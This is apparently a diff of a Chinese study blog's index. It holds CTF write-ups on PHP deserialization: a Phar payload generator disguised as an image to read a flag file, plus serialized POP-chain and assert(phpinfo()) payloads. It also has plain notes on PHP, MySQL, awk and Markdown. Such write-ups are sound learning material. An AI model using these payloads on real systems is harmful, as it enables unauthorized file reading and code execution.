+核心逻辑：通过 Show 对象的 _show() 方法来展示文件。继续读 class.php：
+// class.phpclass C1e4r&#123;    public $test;    public $str;    public function __construct($name)    &#123;        $this-&gt;str = $name;    &#125;    public function __destruct()    &#123;        $this-&gt;test = $this-&gt;str;        echo $this-&gt;test;    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg        echo $this-&gt;source;    &#125;    public function __toString()    &#123;        $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source;        return $content;    &#125;    public function __set($key,$value)    &#123;        $this-&gt;$key = $value;    &#125;    public function _show()    &#123;        if(preg_match(&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;,$this-&gt;source)) &#123;            die(&#x27;hacker!&#x27;);        &#125; else &#123;            highlight_file($this-&gt;source);        &#125;    &#125;    public function __wakeup()    &#123;        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker~&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $file;    public $params;    public function __construct()    &#123;        $this-&gt;params = array();    &#125;    public function __get($key)    &#123;        return $this-&gt;get($key);    &#125;    public function get($key)    &#123;        if(isset($this-&gt;params[$key])) &#123;            $value = $this-&gt;params[$key];        &#125; else &#123;            $value = &quot;index.php&quot;;        &#125;        return $this-&gt;file_get($value);    &#125;    public function file_get($value)    &#123;        $text = base64_encode(file_get_contents($value));        return $text;    &#125;&#125;
 
+再看看 function.php 中的上传逻辑：
+// function.php 核心逻辑function upload_file_do() &#123;    global $_FILES;    $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;;    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename);&#125;function upload_file_check() &#123;    $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;);    $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);    $extension = end($temp);    if(in_array($extension,$allowed_types)) &#123;        return true;    &#125;    // ...&#125;
 
+代码分析
+_show() 方法的过滤：正则 /http|https|file:|gopher|dict|\.\.|f1ag/i 阻止了直接读取 f1ag.php，常规的 php://filter 伪协议也会因为 file_exists() 检查失败而无法使用。
 
-format字符
-描述
-返回值例子
+__construct 中的注释：//$this-&gt;source = phar://phar.jpg，强烈暗示了 Phar 协议的方向。
 
+Test 类中的 file_get()：直接调用 file_get_contents() 读取任意文件并用 base64_encode() 返回，没有任何过滤，是整个攻击链的终点。
 
+上传限制：只检查后缀名，不检查文件内容，可以上传任意内容的 .jpg &#x2F; .gif &#x2F; .png 文件。这正好可以上传 Phar 文件。
 
-Y
-年，四位数字
-例如：1999 或 2003
+文件名规律：md5(原始文件名 . 客户端IP) . &quot;.jpg&quot;，可预测。
 
 
-y
-年，两位数字
-例如：99 或 03
+POP 链分析从终点往起点倒推：
 
 
-m
-月，两位数字
-01-12
 
+步骤
+方法
+触发条件
+作用
 
-M
-月，完整名称
-January 到 December
 
 
-d
-月份中的第几天，有前导零的 2 位数字
-01-31
+终点
+Test::file_get()
+__get() 调用
+读取任意文件，base64 返回
 
 
-j
-月份中的第几天，没有前导零
-1-31
+4
+Test::__get(&#39;source&#39;)
+访问不存在的 source 属性
+调用 get(&#39;source&#39;)，$params[&#39;source&#39;] 设为目标文件
 
 
-D
-星期几，缩写
-Mon - Sun
+3
+Show::__toString()
+对象被当作字符串
+$this-&gt;str[&#39;str&#39;]-&gt;source 触发 Test 的 __get
 
 
-l
-星期几,完整名称
-Monday - Sunday
+2
+C1e4r::__destruct()
+对象销毁
+echo $this-&gt;test 触发 Show 的 __toString
 
 
-H
-小时，24小时制
-00 - 23
+起点
+Phar 反序列化
+phar:// 协议解析
+触发 __destruct 启动整条链
 
 
-h
-小时，12小时制
-00 - 12
+完整调用链：
+phar://upload/xxx.jpg  → 反序列化 C1e4r 对象  → 销毁时调用 C1e4r::__destruct()  → echo Show 对象 触发 Show::__toString()  → $this-&gt;str[&#x27;str&#x27;]-&gt;source 触发 Test::__get(&#x27;source&#x27;)  → Test::get(&#x27;source&#x27;) 调用 file_get(&#x27;/var/www/html/f1ag.php&#x27;)  → base64_encode(file_get_contents(&#x27;f1ag.php&#x27;))  → 输出 base64 编码的源码
 
+构造 Payload&lt;?phpclass C1e4r&#123;    public $test;    public $str;&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $file;    public $params;&#125;// 搭建 POP 链$test = new Test();$test-&gt;params = array(&#x27;source&#x27; =&gt; &#x27;/var/www/html/f1ag.php&#x27;);$show = new Show();$show-&gt;str = array(&#x27;str&#x27; =&gt; $test);$c1e4r = new C1e4r();$c1e4r-&gt;str = $show;// 创建 Phar 文件，伪装成 GIF@unlink(&quot;payload.phar&quot;);@unlink(&quot;payload.jpg&quot;);$phar = new Phar(&quot;payload.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt;setMetadata($c1e4r);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();rename(&quot;payload.phar&quot;, &quot;payload.jpg&quot;);
 
-i
-分钟，两位数字
-00 - 59
+运行前需要关闭 phar.readonly：
+php -d phar.readonly=0 gen_phar.php
 
+利用过程
+上传 payload.jpg（后缀 .jpg 通过扩展名检查），上传后文件路径为 upload/md5(payload.jpg + IP).jpg
 
-s
-秒，两位数字
-00 - 59
+通过 file.php?file=phar://upload/&lt;hash&gt;.jpg 触发 Phar 反序列化
 
+POP 链自动执行，页面返回 f1ag.php 的 base64 编码内容
 
-包含include() 函数和 require() 函数
-include() 函数和 require() 函数用于包含其他文件的内容
+解码得到 flag：
 
-include 和 require 除了处理错误的方式不同之外，在其他方面都是相同的：
-require 生成一个致命错误（E_COMPILE_ERROR），在错误发生后脚本会停止执行。
-include 生成一个警告（E_WARNING），在错误发生后脚本会继续执行。
-尽量使用 require 向执行流引用关键文件。这有助于提高应用程序的安全性和完整性
 
-使用方法&lt;?phpinclude &quot;file.php&quot;;或require &quot;file.php&quot;;?&gt;
-把文件包含后，可以直接调用文件中的公共变量文件处理打开文件&lt;?php$filehandle = fopen(&quot;filename.txt&quot;, &quot;r&quot;);?&gt;
-文件可以通过以下模式打开
+PD9waHAgDQoJLy8kYSA9ICdmbGFnezcyODkzNmNiLWUxMTUtNDIyOS1iOTliLTE3ODFjNzc2NDdiMn0nOw0KID8+DQoNCg==
 
+解码后：
+&lt;?php//$a = &#x27;flag&#123;728936cb-e115-4229-b99b-1781c77647b2&#125;&#x27;;?&gt;
 
-模式
-描述
+总结这道题考察的知识点：
 
+PHP 文件包含漏洞与常见过滤的绕过
+Phar 反序列化的原理与利用条件（phar:// 协议 + file_exists 等文件操作函数触发）
 
+以下文件传入phar://任何文件 可以触发phar反序列化文件存在性检查​​  file_exists(), is_file(), is_dir(), stat() ​​文件内容读取​​  file_get_contents(), fopen(), readfile() ​​文件信息获取​​ filesize(), filectime(), filemtime() ​​目录操作​​ fileatime(), scandir(), opendir() ​​其他文件操作​​ unlink(), copy()
 
-r
-只读，在文件开头读开始
+POP 链的构造思想——从危险函数（file_get_contents）倒推，利用各种魔术方法（__destruct → __toString → __get）串联调用链
+上传功能的扩展名绕过（黑名单不严 + 内容不检查）
 
-
-r+
-读写，在文件开头读开始
-
-
-w
-只写，打开并清空文件的内容；如果文件不存在，则创建新文件。
-
-
-w+
-读写，打开并清空文件的内容；如果文件不存在，则创建新文件。
-
-
-a
-追加。打开并向文件末尾进行写内容，如果文件不存在，则创建新文件。
-
-
-a+
-读&#x2F;追加，打开并向文件末尾进行写内容，保持文件指针在文件末尾，保持文件内容
-
-
-x
-只写，创建新文件。如果文件已存在，则返回 FALSE 和一个错误。
-
-
-x+
-读写，创建新文件。如果文件已存在，则返回 FALSE 和一个错误。
-
-
-注意：如果 fopen() 函数无法打开指定文件，则返回 0 (false)。关闭文件&lt;?phpfclose($filehandle);?&gt;
-检测文件末尾feof() 函数用于检测文件是否到达末尾。读取文件内容fgets() 函数用于读取文件的一行。# 读取文件的最后一行&lt;?phpif (!feof($filehandle)) &#123;    echo fgets($filehandle);&#125;?&gt;
-运用两函数逐行读取文件内容?php$file = fopen(&quot;welcome.txt&quot;, &quot;r&quot;) or exit(&quot;无法打开文件!&quot;);// 读取文件每一行，直到文件结尾while(!feof($file))&#123;    echo fgets($file). &quot;&lt;br&gt;&quot;;&#125;fclose($file);?&gt;
-cookiecookie是一种小文本文件，用于存储用户信息，例如用户名、密码等。当同一个用户再次访问网站时，网站可以使用 cookie来识别用户。setcookie() 函数用于设置 cookie。语法&lt;?phpsetcookie(&quot;cookie名&quot;, &quot;cookie值&quot;, time());?&gt;
-实例&lt;?phpsetcookie(&quot;user&quot;, &quot;lah&quot;, time() + (60 * 5));?&gt;
-回收 cookie可用 $_COOKIE 数组来回收 cookie&lt;?php// 输出 cookie 值echo $_COOKIE[&quot;user&quot;];// 查看所有 cookieprint_r($_COOKIE);?&gt;
-可用isset() 函数来检查 cookie 是否设置&lt;?phpif (isset($_COOKIE[&quot;user&quot;]))    echo &quot;欢迎 &quot; . $_COOKIE[&quot;user&quot;] . &quot;!&lt;br&gt;&quot;;else    echo &quot;普通访客!&lt;br&gt;&quot;;?&gt;
-删除 cookie把时间设置为过去的时间（负数）&lt;?phpsetcookie(&quot;user&quot;, &quot;&quot;, time() - (60 * 5));?&gt;
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-]]></content>
-      <tags>
-        <tag>PHP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[MRCTF2020]Ezpop,构造反序列化pop链</title>
-    <url>/2026/05/13/MRCTF2020-Ezpop-%E6%9E%84%E9%80%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/</url>
-    <content><![CDATA[拿到题目后先解析代码class Modifier &#123;    protected  $var;    public function append($value)&#123;        include($value);    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file=&#x27;index.php&#x27;)&#123;        $this-&gt;source = $file;        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123;    @unserialize($_GET[&#x27;pop&#x27;]);&#125;else&#123;    $a=new Show;    highlight_file(__FILE__);&#125;
-从代码中可以看出
-Modifier类是一个过滤器类，用于过滤输入的文件路径
-Show类是一个显示类，用于显示文件内容
-Test类是一个测试类，用于测试Modifier类的过滤功能
-__wakeup方法用于在反序列化时检查文件路径是否包含特殊字符，如有则过滤
-
-构造pop链1. 发现Modifier类中有include函数,可以作为突破口，把flag.php包含进来查看flag，但是有__invoke方法，所以只有它被当成函数执行的时候才会执行2. 又发现Test类中有__get方法，它把$p变量当成了函数执行，所以可以把$p变量的值设置为Modifier类的实例，这样就可以在__get方法中调用Modifier类的__invoke方法，从而包含flag.php文件，但是只有调用不存在或无法访问的属性时才会调用__get方法3. 发现Show类中__toString方法，它调用了$str变量的source属性，可以把$str变量的值设置为Test类的实例，因为Test中没有source属性，所以这样就可以在__toString方法中调用Test类的__get方法，但是只有它被当成字符串执行时才会调用__toString方法4. 而Show中的construct方法把source属性当成了字符串执行，所以可以把source属性的值设置为Show类的实例，这样就可以在__construct方法中调用Show类的__toString方法，从而包含flag.php文件执行pop链把Modifier类的var属性设置为flag.php,然后各种赋值，最后序列化class Modifier&#123;    protected  $var = &#x27;flag.php&#x27;;    public function append($value)    &#123;        include($value);    &#125;    public function __invoke()    &#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;
-$a = new Modifier;$b = new Show();$c = new Test;$c-&gt;p = $a;$b-&gt;str = $c;$b-&gt;source = $b;echo serialize($b);
-得到序列化字符串
-O:4:”Show”:2:{s:6:”source”;r:1;s:3:”str”;O:4:”Test”:1:{s:1:”p”;O:8:”Modifier”:1:{s:6:”%00*%00var”;s:8:”flag.php”;}}}在*前后加上%00（尽量整个字符串都url编码，这里懒得编码了）
-
-get传参序列化字符串
-并没有显示flag,猜测文件并没有直接输出flag而是设置在变量中，所以把Modifier类的var属性设置为php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php拿到文件的base64编码
-然后解码得到flag
+Phar 反序列化的关键在于：只要有一个能操作文件的函数（file_exists、file_get_contents、include 等）的参数可控，且 Phar 文件能被上传到服务器，就能触发反序列化漏洞。
 ]]></content>
       <tags>
         <tag>解题wp</tag>
         <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MySQL(3)</title>
-    <url>/2026/04/02/MySQL%E5%91%BD%E4%BB%A4-3/</url>
-    <content><![CDATA[一.用户管理1. 创建用户基本格式create user &#x27;username&#x27;@&#x27;localhost&#x27; identified by &#x27;password&#x27;;#&#x27;username&#x27;表示安创建的用尸的用尸名#&#x27;localhost&#x27;表示用户可以通过连接到MySQL服务器的本地主机,用‘%’表示允许来自任何主机的连接。#&#x27;password&#x27;表示要创建的用户的密码
-2. 删除用户基本格式drop user &#x27;username&#x27;@&#x27;localhost&#x27;;#&#x27;username&#x27;表示要删除的用户名
-3. 赋予用户权限基本格式grant 权限 on 数据库名.表名 to 用户名@主机名# 多个权限之间用逗号隔开# 数据库名和表名用*代替分别代表所有数据库和所有表# all privileges 表示赋予所有权限
-实例GRANT SELECT, INSERT ON database_name.table_name TO &#x27;username&#x27;@&#x27;localhost&#x27;;# 给予用户名=username的用户数据库database_name的表table_name的SELECT和INSERT权限
-4. 取消用户权限基本格式revoke 权限 on 数据库名.表名 from 用户名@主机名
-实例REVOKE SELECT, INSERT ON database_name.table_name FROM &#x27;username&#x27;@&#x27;localhost&#x27;;# 取消用户名=username的用户数据库database_name的表table_name的SELECT和INSERT权限
-
-5. 查看用户权限基本格式show grants for 用户名@主机名
-实例SHOW GRANTS FOR &#x27;username&#x27;@&#x27;localhost&#x27;;# 查看用户名=username的用户的所有权限
-权限列表
-
-
-权限
-描述
-
-
-
-all privileges
-赋予所有权限
-
-
-select
-查询
-
-
-insert
-插入
-
-
-update
-更新
-
-
-delete
-删除
-
-
-create
-创建
-
-
-drop
-删除
-
-
-alter
-修改
-
-
-二.数据的约束1. 约束类型
-
-
-约束
-描述
-
-
-
-not null
-不允许为空
-
-
-unique
-唯一
-
-
-primary key
-主键
-
-
-default（默认值）
-当列为空时，显示默认值
-
-
-2. 在创建表时添加约束基本格式create table 表名 (    列名 数据类型 约束,    列名 数据类型 约束,    ...);
-3. 在表创建后修改约束基本格式alter table 表名 modify 列名 数据类型 约束;
-删除约束基本格式alter table 表名 modify 列名 数据类型;# 不加约束，默认为允许null
-
-
-
-
-]]></content>
-      <tags>
-        <tag>MySQL</tag>
       </tags>
   </entry>
   <entry>
@@ -844,41 +1122,102 @@ More info: Deployment
 ]]></content>
   </entry>
   <entry>
-    <title>MySQL的配置</title>
-    <url>/2026/03/29/MySQL%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[一.下载从MySQL官网上下载第二个文件（约550MB）
-下载完后跟着系统默认指示操作（在指定文件存放地址的时候最好不要放在c盘（系统盘），MySQL后期占用内存大）操作完后点击finish按钮即下载完成二.配置环境变量刚下载完后是无法通过终端直接连接MySQL数据库的，要把MySQL设置成环境变量才行先进入高级系统设置，在进入环境变量，在系统变量中新建变量，命名MySQL_Home(随意命名)，变量值为C:\Program Files\MySQL\MySQL Server 8.0
-再编辑系统变量里的Path变量，新建一个变量%MySQL_Home%\bin(用%包裹刚创建的MySQL_Home变量可直接代表路径)
-注意：如果Path变量里已经有了类似于phpstudy集成环境自带的MySQL,一定要把新建的MySQL变量放在其前面，不然系统会优先调用phpstudy集成环境自带的MySQL客户端，导致客户端与服务端不匹配，ssh无法认证，从而无法连接数据库。（之前因为这个问题在实验室卡了一个下午加一晚上）
+    <title>awk脚本的语法</title>
+    <url>/2026/03/25/awk%E8%84%9A%E6%9C%AC%E7%9A%84%E8%AF%AD%E6%B3%95/</url>
+    <content><![CDATA[如何调用脚本一. 使用 -f 选项运行脚本将 awk 命令写入一个文本文件（例如 my.awk），然后用 -f 调用：awk -f my.awk 输入文件1 [输入文件2 ...]
+示例脚本 my.awk:BEGIN &#123; print &quot;开始处理&quot; &#125;&#123; print &quot;行号:&quot; NR, &quot;内容:&quot; $0 &#125;END &#123; print &quot;处理完成&quot; &#125;
+运行：awk -f my.awk data.txt
+二. 让 awk 脚本直接可执行（shebang）在脚本文件的第一行添加 #!&#x2F;usr&#x2F;bin&#x2F;awk -f，然后赋予执行权限。示例脚本 count.awk：#!/usr/bin/awk -f# 统计非空行数量BEGIN &#123; count = 0 &#125;NF &gt; 0 &#123; count++ &#125;END &#123; print &quot;非空行数:&quot;, count &#125;
+赋予权限并运行：chmod +x count.awk./count.awk data.txt
+注意：shebang 中 awk 的路径是 &#x2F;usr&#x2F;bin&#x2F;awk，也可用 #!&#x2F;usr&#x2F;bin&#x2F;env awk -f 以增强可移植性。三. 在脚本中处理多个文件awk -f script.awk file1.txt file2.txt
 
-在完成以上配置后就可以通过终端直接连接MySQL了
-三.安装可视化工具MySQL的可视化工具构建图形化界面可以让对MySQL的操作可视化，使操作更方便SQLyog是一个适合初学者的可视化工具，支持中文且不会自动补全命令，便于记忆操作命令下载地址
+四. 向脚本传递变量使用 -v 选项可以在脚本执行前定义变量：awk -f script.awk -v threshold=100 data.txt
+脚本内可直接使用 threshold。五. 结合其他选项
+指定字段分隔符：awk -F, -f script.awk data.csv
+使用多个脚本文件：可以多次使用 -f，如 awk -f common.awk -f main.awk data.txt
 
-上框输入操作命令，下框执行命令并可视化此时，MySQL的基本配置已完成]]></content>
-      <tags>
-        <tag>MySQL</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[NPUCTF2020]ReadlezPHP,反序列化漏洞</title>
-    <url>/2026/05/16/NPUCTF2020-ReadlezPHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[进入题目，查看网页源码
-发现可疑网址，点击进入
-找到题目代码，是反序列化题目核心代码为：public function __destruct()&#123;        $a = $this-&gt;a;        $b = $this-&gt;b;        echo $b($a);    &#125;
-可以构造变量a—&gt;phpinfo()，变量b—&gt;assert；组合起来后—&gt;assert(phpinfo()),使代码执行phpinfo()assert()函数的功能：
-在 PHP 8 以前的版本（如 5.x），assert() 的参数可以是字符串，并会像 eval() 一样被执行
+六.调试与注意事项
+语法检查：可用 awk -f script.awk –source ‘BEGIN{exit}’ 简单检查，或使用 gawk –lint -f script.awk。
+脚本中的注释：以 # 开头，直到行末。
+换行与分号：语句之间可用分号分隔，也可换行。
+函数定义：支持自定义函数，放在脚本中适当位置。
 
-构造出序列化字符串
-O:8:”HelloPhp”:2:{s:1:”a”;s:9:”phpinfo()”;s:1:”b”;s:6:”assert”;}
+awk脚本的结构和语法一.脚本的基本结构BEGIN &#123; 初始化操作 &#125;            # 在处理任何输入行之前执行/正则/ &#123; 匹配时执行的动作 &#125;     # 匹配正则的行条件表达式 &#123; 动作 &#125;             # 条件为真时执行END &#123; 汇总操作 &#125;               # 所有输入行处理完后执行
+示例：BEGIN &#123; FS=&quot;:&quot;; print &quot;开始处理&quot; &#125;$3 &gt;= 1000 &#123; print $1, $3 &#125;END &#123; print &quot;处理完成&quot; &#125;
+二.变量与内置变量内置变量（部分）
 
-get传输使网页执行phpinfo()
-传输之前要把source参数去掉，否则会优先执行highlight_file(FILE);的结果而覆盖phpinfo()的执行结果
 
-ctrl+f搜索flag查找到flag
+变量
+含义
+
+
+
+$0
+当前整行
+
+
+$n
+第n个字段
+
+
+NF
+当前行字段数
+
+
+NR
+当前行号（所有文件累计）
+
+
+FNR
+当前文件内行号
+
+
+FS
+输入字段分隔符（默认空格或制表符）
+
+
+OFS
+输出字段分隔符（默认空格）
+
+
+RS
+输入记录分隔符（默认换行）
+
+
+ORS
+输出记录分隔符（默认换行）
+
+
+ARGC, ARGV
+命令行参数数组
+
+
+FILENAME
+当前输入文件名
+
+
+三.用户自定义变量变量名由字母、数字、下划线组成，区分大小写，无需显式声明，默认值为空字符串或0。BEGIN &#123; count = 0 &#125;&#123; count++ &#125;END &#123; print &quot;总行数:&quot;, count &#125;
+运算符
+算术：+、 -、 *、 &#x2F;、 %、 ^（^ 为乘方）
+
+字符串连接：空格, “a” “b” 得 “ab”
+
+赋值：&#x3D;、 +&#x3D;、 -&#x3D;、 *&#x3D;、 &#x2F;&#x3D;、 %&#x3D;、 ^&#x3D;
+
+比较：&#x3D;&#x3D;、 !&#x3D;、 &gt;、 &lt;、 &gt;&#x3D;、 &lt;&#x3D;（字符串比较按字典序）
+
+逻辑：&amp;&amp;、||、!
+
+三元：条件 ? 表达式1 : 表达式2
+
+
+四.控制语句if-elseif (条件) &#123;    语句&#125; else if (条件) &#123;    语句&#125; else &#123;    语句&#125;
+while&#x2F;do-whilewhile (条件) 语句do 语句 while (条件)
+for循环for (初始化; 条件; 迭代) 语句for (i in 数组) 语句   # 遍历数组下标
+未完待续
 ]]></content>
       <tags>
-        <tag>解题wp</tag>
-        <tag>反序列化</tag>
+        <tag>linux</tag>
       </tags>
   </entry>
   <entry>
@@ -909,6 +1248,159 @@ awk ‘&#x2F;example&#x2F; {print NR, $0}’ filename.txt（打印包含”examp
 ]]></content>
       <tags>
         <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>markdown语法</title>
+    <url>/2026/03/28/markdown%E8%AF%AD%E6%B3%95/</url>
+    <content><![CDATA[一.Markdown标题语法要创建标题，请在单词或短语前面添加井号 (#) 。# 的数量代表了标题的级别。
+#一级标题##二级标题###三级标题####四级标题
+二.Markdownd段落语法创建段落，要使用空白行将一行或多行文本进行分隔。
+段落a
+段落b
+段落c
+
+注意：（不要用空格或制表符（ tabs）缩进段落。）三.Markdown的换行语法在一行的末尾添加两个或多个空格，然后按回车键,即可创建一个换行。（为了兼容性，可以在行尾添加“结尾空格”或 HTML 的 &lt;br&gt; 标签来实现换行。）
+
+四.Markdown的强调语法粗体
+
+
+语法
+文本
+预览
+
+
+
+**  **
+**粗体**字符
+粗体字符
+
+
+__  __（不建议）
+__粗体__字符
+粗体字符
+
+
+斜体
+
+
+语法
+文本
+预览
+
+
+
+*  *
+*斜体*字符
+斜体字符
+
+
+_  _（不建议）
+_斜体_字符
+斜体字符
+
+
+粗体加斜体
+
+
+语法
+文本
+预览
+
+
+
+***  ***
+***粗斜***字符
+粗斜字符
+
+
+___  ___
+___粗斜___字符
+粗斜字符
+
+
+五.Markdown引用语法要创建块引用，请在段落前添加一个 &gt; 符号。
+这是一个块引用
+块引用可以包含多个段落，每个段落前都需要添加 &gt; 符号。
+
+嵌套块引用
+这是一个块引用
+
+这是一个嵌套的块引用
+
+这是一个更深层的嵌套块引用
+
+
+
+六.Markdown列表语法无序列表要创建无序列表，请在每个列表项前添加破折号 (-)、星号 (*) 或加号 (+) 。
+
+
+列表项 1
+列表项 2
+列表项 3
+
+
+有序列表要创建有序列表，请在每个列表项前添加数字和一个英文句点。
+
+第一个列表项
+第二个列表项
+第三个列表项
+
+
+嵌套列表
+
+第一个列表项
+嵌套的无序列表项
+嵌套的无序列表项
+
+
+第二个列表项
+嵌套的有序列表项
+嵌套的有序列表项
+
+
+
+
+七.Markdown代码语法行内代码要将单词或短语表示为代码，请将其包裹在反引号 (`) 中。
+
+这是 行内代码 示例
+代码块要创建代码块，请将代码块的每一行都缩进至少四个空格或一个制表符。
+function hello() &#123;    console.log(&quot;Hello, Markdown!&quot;);&#125;
+
+或者可以使用三个反引号 (```) 来创建代码块，这是更常用的方法：
+function hello() &#123;    console.log(&quot;Hello, Markdown!&quot;);&#125;
+
+八.Markdown分隔线语法要创建分隔线，请在单独一行上使用三个或更多的星号 (***)、破折号 (---) 或下划线 (___) ，并且不能包含其他内容。
+
+
+
+
+
+九.Markdown链接语法基本链接要创建链接，请使用方括号 [] 包裹链接文本，后面跟着圆括号 () 包裹链接地址。
+[文本](网址)
+百度
+
+带标题的链接还可以在链接地址后面添加可选的标题，用引号包裹。
+[文本](网址 “标题”)
+百度
+
+引用样式链接引用样式链接由两部分组成：
+&gt;[文本1](网址1 “标题1”)&gt;[文本2](网址2 “标题2”)
+百度Google
+
+十.Markdown图片语法基本图片要添加图片，请使用感叹号 (!)，后跟方括号 [] 包裹替代文本，然后是圆括号 () 包裹图片链接。
+![示例图片](图片地址)
+带标题的图片您还可以在图片链接后面添加可选的标题，用引号包裹。
+
+![示例图片](图片地址 “图片标题”)
+引用样式图片与链接类似，图片也可以使用引用样式：
+
+![示例图片](图片地址 “图片标题”)
+十一.Markdown转义字符语法要显示原本用于格式化 Markdown 文档的特殊字符，请在字符前添加反斜杠 (\)。
+* 这不是斜体文本 *# 这不是标题[ 这不是链接开始
+]]></content>
+      <tags>
+        <tag>markdown</tag>
       </tags>
   </entry>
   <entry>
@@ -1176,660 +1668,6 @@ grep 搜索文件内容
       </tags>
   </entry>
   <entry>
-    <title>MySQL命令(1)</title>
-    <url>/2026/03/29/MySQL%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[一.创建数据库1. 直接创建数据库（默认字符集和排序规则）create database 数据库名;
-
-2. 判断数据库是否存在，不存在则创建create database if not exists 数据库名;
-
-3. 指定字符集创建数据库create database 数据库名 character set 字符集;
-
-4. 指定字符集和排序规则创建数据库create database 数据库名 character set 字符集 collate 排序规则;
-
-字符集种类
-utf8mb3（支持中文，过时）
-utf8mb4（支持emoji表情，mysql8.0默认字符集）
-
-排序规则种类
-utf8mb3_general_ci（支持中文，过时）
-utf8mb4_general_ci（支持emoji表情，大小写敏感排序）
-utf8mb4_ai_ci（支持emoji表情，unicode排序,大小写和重音敏感排序,mysql8.0默认排序规则）
-utf8mb4_as_ci（支持emoji表情，unicode排序，大小写和重音敏感排序）
-
-注意:创建数据库时，字符集和排序规则必须一致(utf8mb3对utf8mb3_general_ci，utf8mb4对utf8mb4_general_ci)查看数据库字符集和排序规则show variables like &#x27;character_set_database&#x27;;show variables like &#x27;collation_database&#x27;;
-
-二.库的查看与切换1. 查看当前所有库show databases;
-
-2. 查看当前使用库select database();
-
-3. 查看指定库下的所有表show tables from 数据库名;
-
-4. 查看创建库的信息show create database 数据库名;
-
-5. 切换到指定库use 数据库名;
-
-注意:切换库后，当前会话库会改变，后续操作会默认在切换后的库下进行。所以要操作指定库下的表和数据前，需要先切换到该库。三.库的删除与修改1. 删除数据库drop database 数据库名;
-
-2. 判断数据库是否存在，不存在则删除drop database if exists 数据库名;
-
-3. 修改数据库字符集alter database 数据库名 character set 字符集;
-
-4. 修改数据库排序规则alter database 数据库名 collate 排序规则;
-
-5. 同时修改数据库字符集和排序规则alter database 数据库名 character set 字符集 collate 排序规则;
-
-
-四.表的创建1.基本格式create table [if not exists] 表名(列名 类型 [列可选约束][COMMENT&#x27;列可选注释&#x27;],列名 类型 [列可选约束][COMMENT‘列可选注释&#x27;],列名 类型 [列可选约束][COMMENT&#x27;列可选注释’],列名 类型 [列可选约束][COMMENT‘列可选注释&#x27;],#列之间使用,分割)[表可选约束][COMMENT‘表可选注释’];
-
-2. 实例create table if not exists book_lib(    book_id int primary key comment &#x27;图书id&#x27;,    book_name varchar(20) comment &#x27;图书名称&#x27;,    book_author varchar(20) comment &#x27;图书作者&#x27;,    book_price double(4,1) comment &#x27;图书价格&#x27;)charset=utf8mb4 coll=utf8mb4_ai_ci;
-
-介绍:创建了一个名为book_lib的表，包含图书id，图书名称，图书作者，图书价格四列，图书id为主键，图书价格为双精度浮点数，图书名称和图书作者均为varchar类型（最大长度为20个字符）。表的字符集为utf8mb4，排序规则为utf8mb4_ai_ci。五.表的数据类型1. 整数类型
-
-
-类型
-存储（字节）
-范围
-
-
-
-tinyint（mysql独有）
-1
--128~127
-
-
-smallint（sql通用）
-2
--32768~32767
-
-
-mediumint (mysql独有)
-3
--16777216~16777215
-
-
-bigint（mysql独有）
-8
--2^63~2^63-1
-
-
-int（sql通用）
-4
--2^31~2^31-1
-
-
-注意：加上unsigned后，对应列数据变成无负号整数，范围大小不变，但最小值从0开始。例：stu_age tinyint unsigned COMMENT‘年龄字段,tinyint类型,无符号值从0开始’,stu_age tinyint COMMENT‘年龄字段,tinyint类型,无符号值从-128开始&#x27;,
-
-2. 浮点&#x2F;定点数类型
-
-
-类型
-存储（字节）
-范围
-
-
-
-float
-4
--3^23~3^23
-
-
-double
-8
--3^64~3^64
-
-
-stu_height float(4,1) unsigned COMMENT‘身高,保留一位小数,多位会四舍五入,无符号值从0开始’-- 比如180.66会被四舍五入为180.7
-
-注意：从MySQL 8.0.17 开始,不推荐使用非标准FLOAT(M,D)语法DOUBLE(M,D),未来版本中可能删除对它的支持。（支持unsigned修饰,添加修饰,只保留正值范围负值不会迁移到正值!）
-
-
-类型
-存储(字节)
-M(小数+整数位数)
-D(小位数)
-
-
-
-decimal(M,D)
-动态计算
